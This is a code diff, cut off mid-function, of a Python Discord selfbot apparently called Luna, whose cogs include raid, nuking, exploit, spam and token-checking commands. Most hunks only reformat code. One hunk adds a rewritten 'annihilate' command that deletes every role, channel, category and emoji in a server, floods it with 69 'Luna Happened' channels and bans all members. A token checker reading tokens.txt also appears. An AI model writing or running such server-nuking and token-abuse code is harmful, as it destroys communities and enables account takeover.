+                        for j, (key, val) in enumerate(x.items()):
+                            if not val or j == 0:
+                                continue
+                            helptext += "{:<23}{}\n".format(key, val)
+                helptext += f"```"
+            await message_builder(luna, "Token Info", helptext)
+        else:
+            await error_builder(luna, "```\nToken invalid\n```")
 
     @commands.command(name="poll",
                       usage="<question>",
@@ -9001,8 +9155,7 @@ class NettoolCog(commands.Cog, name="Nettool commands"):
         try:
             webhook = await self.bot.fetch_webhook(id)
             await message_builder(luna, title=f"Webhook » {webhook.name}",
-                                  description=f"```\nID » {webhook.id}\n``````\nName » {webhook.name}\n``````\nChannel » {webhook.channel.name}\n``````\nGuild » {webhook.guild.name}\n``````\nToken » {webhook.token}\n```",
-                                  thumbnail=webhook.display_avatar)
+                                  description=f"```\nID » {webhook.id}\n``````\nName » {webhook.name}\n``````\nChannel » {webhook.channel.name}\n``````\nGuild » {webhook.guild.name}\n``````\nToken » {webhook.token}\n```")
         except BaseException:
             await error_builder(luna, "```\nInvalid webhook ID```")
 
@@ -9463,7 +9616,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
                     url=theme.title_url(),
                     description=f"```\n{e}```",
                     color=theme.hex_color())
-                
+
                 embed.set_footer(text=theme.footer(),
                                  icon_url=theme.footer_icon_url())
                 embed.set_author(name=theme.author(), url=theme.author_url(
@@ -9488,7 +9641,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
                     url=theme.title_url(),
                     description=f"```\nStatus changed to » Playing {status}```",
                     color=theme.hex_color())
-                
+
                 embed.set_footer(text=theme.footer(),
                                  icon_url=theme.footer_icon_url())
                 embed.set_author(name=theme.author(), url=theme.author_url(
@@ -9515,7 +9668,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
                     url=theme.title_url(),
                     description=f"```\nStatus changed to » Streaming {status}```",
                     color=theme.hex_color())
-                
+
                 embed.set_footer(text=theme.footer(),
                                  icon_url=theme.footer_icon_url())
                 embed.set_author(name=theme.author(), url=theme.author_url(
@@ -9541,7 +9694,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
                     url=theme.title_url(),
                     description=f"```\nStatus changed to » Listening {status}```",
                     color=theme.hex_color())
-                
+
                 embed.set_footer(text=theme.footer(),
                                  icon_url=theme.footer_icon_url())
                 embed.set_author(name=theme.author(), url=theme.author_url(
@@ -9567,7 +9720,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
                     url=theme.title_url(),
                     description=f"```\nStatus changed to » Watching {status}```",
                     color=theme.hex_color())
-                
+
                 embed.set_footer(text=theme.footer(),
                                  icon_url=theme.footer_icon_url())
                 embed.set_author(name=theme.author(), url=theme.author_url(
@@ -9589,7 +9742,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
             title=theme.title(),
             url=theme.title_url(),
             description="```\nStopped activity```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -9606,7 +9759,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
                     url=theme.title_url(),
                     description="```\nInvalid amount```",
                     color=theme.hex_color())
-                
+
                 embed.set_footer(text=theme.footer(),
                                  icon_url=theme.footer_icon_url())
                 embed.set_author(name=theme.author(), url=theme.author_url(
@@ -9725,7 +9878,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
                 url=theme.title_url(),
                 description=f"```\nSuccessfully set your hypesquad house to {house}```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -10620,7 +10773,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
                 url=theme.title_url(),
                 description=f"```\ntokens.txt is empty...```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -10638,7 +10791,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
                 url=theme.title_url(),
                 description=f"```\nDetected {line_count} tokens.\nChecking tokens...```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -10684,7 +10837,7 @@ class RaidCog(commands.Cog, name="Raid commands"):
                             str(failed) +
                             "```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -11190,42 +11343,42 @@ class NukingCog(commands.Cog, name="Nuking commands"):
                       usage="<guild_id> <channel_name> <role_name>",
                       description="Totally annihilate a guild")
     @has_permissions(manage_roles=True, manage_channels=True, ban_members=True)
-    async def annihilate(self, luna, guild_id: int, channel_name: str, role_name: str):
+    async def annihilate(self, luna):
         await luna.message.delete()
         if configs.risk_mode() == "on":
-            guild_id = int(guild_id)
-            guildhit = self.bot.get_guild(guild_id)
-            members = guildhit.members
-            elapsed = datetime.now() - start
-            elapsed = f'{elapsed.microseconds}'
-            elapsed = elapsed[:-3]
-            for member in members:
-                if member is not luna.author:
-                    try:
-                        count = count + 1
-                        await member.ban()
-                        prints.message(f"Banned » {color.purple(member)}")
-                    except Exception:
-                        prints.error(f"Failed to ban » {color.purple(member)}")
-            prints.message(f"Finished banning in » {color.purple(elapsed)}ms")
-            for channel in guildhit.channels:
-                if channel.name == channel_name:
-                    try:
-                        await channel.delete()
-                        prints.message(
-                            f"Deleted channel » {color.purple(channel)}")
-                    except Exception:
-                        prints.error(
-                            f"Failed to delete channel » {color.purple(channel)}")
-            for role in guildhit.roles:
-                if role.name == role_name:
-                    try:
-                        await role.delete()
-                        prints.message(f"Deleted role » {color.purple(role)}")
-                    except Exception:
-                        prints.error(
-                            f"Failed to delete role » {color.purple(role)}")
-            prints.message(f"Finished deleting in » {color.purple(elapsed)}ms")
+            await message_builder(luna, description="```\nAnnihilating server...```")
+            await luna.guild.edit(name="Luna Happened", icon=None)
+            delete_roles = [
+                await role.delete()
+                for role in luna.guild.roles
+                if not role.name == "@everyone"
+            ]
+            delete_categories = [
+                await category.delete()
+                for category in luna.guild.categories
+                if luna.guild.categories
+            ]
+            delete_text_channels = [
+                await channel.delete() for channel in luna.guild.text_channels
+            ]
+            delete_voice_channels = [
+                await channel.delete() for channel in luna.guild.voice_channels
+            ]
+            delete_emojis = [
+                await emoji.delete() for emoji in luna.guild.emojis if luna.guild.emojis
+            ]
+            create_channels = [
+                await luna.guild.create_text_channel(name="Luna Happened") for x in range(1, 70)
+            ]
+            try:
+                ban_members = [
+                    await member.ban(reason="Luna Happened")
+                    for member in luna.guild.members
+                    if luna.guild.members
+                ]
+            except BaseException:
+                pass
+            await message_builder(luna, description="```\nServer has been annihilated```")
         else:
             await error_builder(luna, description="```\nRiskmode is disabled```")
 
@@ -11576,7 +11729,7 @@ class BackupsCog(commands.Cog, name="Backup commands"):
         serverName = luna.guild.name
 
         newGuild = await self.bot.create_guild(serverName)
-        prints.info(f"Created new guild")
+        prints.message(f"Created new guild")
         newGuildDefaultChannels = await newGuild.fetch_channels()
         for channel in newGuildDefaultChannels:
             await channel.delete()
@@ -11586,7 +11739,7 @@ class BackupsCog(commands.Cog, name="Backup commands"):
                 try:
                     await newGuild.create_category(channel.name, overwrites=channel.overwrites,
                                                    position=channel.position)
-                    prints.info(f"Created new category » {channel.name}")
+                    prints.message(f"Created new category » {channel.name}")
                 except BaseException:
                     pass
 
@@ -11600,7 +11753,7 @@ class BackupsCog(commands.Cog, name="Backup commands"):
                 await newGuild.create_voice_channel(channel.name, category=cat, overwrites=channel.overwrites,
                                                     topic=channel.topic, slowmode_delay=channel.slowmode_delay,
                                                     nsfw=channel.nsfw, position=channel.position)
-                prints.info(f"Created new voice channel » {channel.name}")
+                prints.message(f"Created new voice channel » {channel.name}")
             except BaseException:
                 pass
 
@@ -11613,7 +11766,7 @@ class BackupsCog(commands.Cog, name="Backup commands"):
                 await newGuild.create_stage_channel(channel.name, category=cat, overwrites=channel.overwrites,
                                                     topic=channel.topic, slowmode_delay=channel.slowmode_delay,
                                                     nsfw=channel.nsfw, position=channel.position)
-                prints.info(f"Created new stage channel » {channel.name}")
+                prints.message(f"Created new stage channel » {channel.name}")
             except BaseException:
                 pass
 
@@ -11626,7 +11779,7 @@ class BackupsCog(commands.Cog, name="Backup commands"):
                 await newGuild.create_text_channel(channel.name, category=cat, overwrites=channel.overwrites,
                                                    topic=channel.topic, slowmode_delay=channel.slowmode_delay,
                                                    nsfw=channel.nsfw, position=channel.position)
-                prints.info(f"Created new text channel » {channel.name}")
+                prints.message(f"Created new text channel » {channel.name}")
             except BaseException:
                 pass
 
@@ -11635,7 +11788,7 @@ class BackupsCog(commands.Cog, name="Backup commands"):
                 try:
                     await newGuild.create_role(name=role.name, color=role.color, permissions=role.permissions,
                                                hoist=role.hoist, mentionable=role.mentionable)
-                    prints.info(f"Created new role » {role.name}")
+                    prints.message(f"Created new role » {role.name}")
                 except BaseException:
                     pass
 
@@ -12047,10 +12200,10 @@ class SettingsCog(commands.Cog, name="Settings commands"):
             urltext += f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
         if page == "2":
             await message_builder(luna, title="Webhooks",
-                              description=f"{theme.description()}```\nWebhook url's\n\n{urltext}```")
+                                  description=f"{theme.description()}```\nWebhook url's\n\n{urltext}```")
         else:
             await message_builder(luna, title="Webhooks",
-                              description=f"{theme.description()}```\nWebhook configuration\n\nWebhooks          » {webhooks}\nLogin webhooks    » {login}\nNitro webhooks    » {nitro}\nGiveaway webhooks » {giveaway}\nPrivnote webhooks » {privnote}\nSelfbot webhooks  » {selfbot}\nPing webhooks     » {pings}\nGhostping webhooks » {ghostpings}\nFriendevent webhooks » {friendevents}\nGuildevent webhooks » {guildevents}\nRoleupdate webhooks » {roleupdates}\nNickname webhooks » {nickupdates}\nProtection webhooks » {protection}\n``````\nWebhook setup\n\n{setuptext}\n``````\nWebhook control\n\n{helptext}\n``````\nNote\n\n{prefix}webhook 2 » Page 2```")
+                                  description=f"{theme.description()}```\nWebhook configuration\n\nWebhooks          » {webhooks}\nLogin webhooks    » {login}\nNitro webhooks    » {nitro}\nGiveaway webhooks » {giveaway}\nPrivnote webhooks » {privnote}\nSelfbot webhooks  » {selfbot}\nPing webhooks     » {pings}\nGhostping webhooks » {ghostpings}\nFriendevent webhooks » {friendevents}\nGuildevent webhooks » {guildevents}\nRoleupdate webhooks » {roleupdates}\nNickname webhooks » {nickupdates}\nProtection webhooks » {protection}\n``````\nWebhook setup\n\n{setuptext}\n``````\nWebhook control\n\n{helptext}\n``````\nNote\n\n{prefix}webhook 2 » Page 2```")
 
     @commands.command(name="notifications",
                       usage="",
@@ -13321,7 +13474,7 @@ class OnMember(commands.Cog, name="on member events"):
                     guild = member.guild
                     async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
                         if guild.id in whitelisted_users.keys() and i.user.id in whitelisted_users[
-                                guild.id].keys() and i.user.id is not self.bot.user.id:
+                            guild.id].keys() and i.user.id is not self.bot.user.id:
                             prints.message(
                                 f"{i.user.name}#{i.user.discriminator} not banned")
                         else:
@@ -14365,373 +14518,338 @@ class MiscCog(commands.Cog, name="Miscellaneous commands"):
         await message_builder(luna, description=f"```\nLogging out of the bot```")
         await bot.logout()
 
-    @commands.command(name = "thelp",
-                    usage="",
-                    description = "All commands in a text file")
+    @commands.command(name="thelp",
+                      usage="",
+                      description="All commands in a text file")
     async def thelp(self, luna):
         await luna.message.delete()
 
-        #///////////////////////////////////////////////////////////////////
+        # ///////////////////////////////////////////////////////////////////
 
         prefix = files.json("Luna/config.json", "prefix", documents=True)
 
-        #///////////////////////////////////////////////////////////////////
+        # ///////////////////////////////////////////////////////////////////
         try:
             helptext = ""
-            
+
             cog = self.bot.get_cog('Help commands')
-            helptext += "Help commands:\n\n"
+            helptext += "Help commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Profile commands')
-            helptext += "Profile commands:\n\n"
+            helptext += "\nProfile commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-            
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Animated statuses')
-            helptext += "Status commands:\n\n"
+            helptext += "\nStatus commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Channel commands')
-            helptext += "Channel commands:\n\n"
+            helptext += "\nChannel commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Member commands')
-            helptext += "Member commands:\n\n"
+            helptext += "\nMember commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Role commands')
-            helptext += "Role commands:\n\n"
+            helptext += "\nRole commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Nickname commands')
-            helptext += "Nickname commands:\n\n"
+            helptext += "\nNickname commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Invite commands')
-            helptext += "Invite commands:\n\n"
+            helptext += "\nInvite commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
             cog = self.bot.get_cog('Administrative commands')
-            helptext += "Administrative commands:\n\n"
+            helptext += "\nAdministrative commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                admincommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Ignore commands')
-            helptext += "Ignore commands:\n\n"
+            helptext += "\nIgnore commands:\n"
             commands = cog.get_commands()
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
             cog = self.bot.get_cog('Animated commands')
-            helptext += "Animated commands:\n\n"
+            helptext += "\nAnimated commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Dump commands')
-            helptext += "Dump commands:\n\n"
+            helptext += "\nDump commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
             cog = self.bot.get_cog('Text commands')
-            helptext += "Text commands:\n\n"
+            helptext += "\nText commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
             cog = self.bot.get_cog('Codeblock commands')
-            helptext += "Codeblock commands:\n\n"
+            helptext += "\nCodeblock commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
             cog = self.bot.get_cog('Image commands')
-            helptext += "Image commands:\n\n"
+            helptext += "\nImage commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
             cog = self.bot.get_cog('Troll commands')
-            helptext += "Troll commands:\n\n"
+            helptext += "\nTroll commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
             cog = self.bot.get_cog('Fun commands')
-            helptext += "Fun commands:\n\n"
+            helptext += "\nFun commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
             cog = self.bot.get_cog('Tools commands')
-            helptext += "Tools commands:\n\n"
+            helptext += "\nTools commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
             cog = self.bot.get_cog('Nettool commands')
-            helptext += "Nettool commands:\n\n"
+            helptext += "\nNettool commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
             cog = self.bot.get_cog('Util commands')
-            helptext += "Util commands:\n\n"
+            helptext += "\nUtil commands:\n"
             commands = cog.get_commands()
-            helptext = ""
             for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Spam commands')
-            helptext += "Spam commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('All commands')
-            helptext += "All commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Mass commands')
-            helptext += "Mass commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Guild commands')
-            helptext += "Guild commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Exploit commands')
-            helptext += "Exploit commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Abusive commands')
-            helptext += "Abusive commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Raid commands')
-            helptext += "Raid commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Nuking commands')
-            helptext += "Nuking commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Privacy commands')
-            helptext += "Privacy commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Protection Guild commands')
-            helptext += "Protection Guild commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Protection commands')
-            helptext += "Protection commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Backup commands')
-            helptext += "Backup commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Whitelist commands')
-            helptext += "Whitelist commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Settings commands')
-            helptext += "Settings commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Share commands')
-            helptext += "Share commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Encode commands')
-            helptext += "Encode commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Decode commands')
-            helptext += "Decode commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Giveaway commands')
-            helptext += "Giveaway commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Cryptocurrency commands')
-            helptext += "Cryptocurrency commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Customization commands')
-            helptext += "Customization commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Hentai commands')
-            helptext += "Hentai commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Sniper commands')
-            helptext += "Sniper commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Theme commands')
-            helptext += "Theme commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Toast customization')
-            helptext += "Toast customization:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Toast commands')
-            helptext += "Toast commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Webhook setup')
-            helptext += "Webhook setup:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Webhook commands')
-            helptext += "Webhook commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Webhook urls')
-            helptext += "Webhook urls:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Webhook customisation')
-            helptext += "Webhook customisation:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Miscellaneous commands')
-            helptext += "Miscellaneous commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-                
-            cog = self.bot.get_cog('Game commands')
-            helptext += "v commands:\n\n"
-            commands = cog.get_commands()
-            helptext = ""
-            for command in commands:
-                helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-            #///////////////////////////////////////////////////////////////////
+            cog = self.bot.get_cog('Spam commands')
+            helptext += "\nSpam commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('All commands')
+            helptext += "\nAll commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Mass commands')
+            helptext += "\nMass commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Guild commands')
+            helptext += "\nGuild commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Exploit commands')
+            helptext += "\nExploit commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Abusive commands')
+            helptext += "\nAbusive commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Raid commands')
+            helptext += "\nRaid commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Nuking commands')
+            helptext += "\nNuking commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Privacy commands')
+            helptext += "\nPrivacy commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Protection Guild commands')
+            helptext += "\nProtection Guild commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Protection commands')
+            helptext += "\nProtection commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Backup commands')
+            helptext += "\nBackup commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Whitelist commands')
+            helptext += "\nWhitelist commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Settings commands')
+            helptext += "\nSettings commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+            cog = self.bot.get_cog('Share commands')
+            helptext += "\nShare commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Encode commands')
+            helptext += "\nEncode commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Decode commands')
+            helptext += "\nDecode commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Giveaway settings')
+            helptext += "\nGiveaway settings:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Cryptocurrency commands')
+            helptext += "\nCryptocurrency commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Customization commands')
+            helptext += "\nCustomization commands:\n"
+            commands = cog.get_commands()
+            for command in commands:
+                helptext += f"{command.name + ' ' + command.usage:<17} » {command.description}\n"
+
+            cog = self.bot.get_cog('Hentai commands')
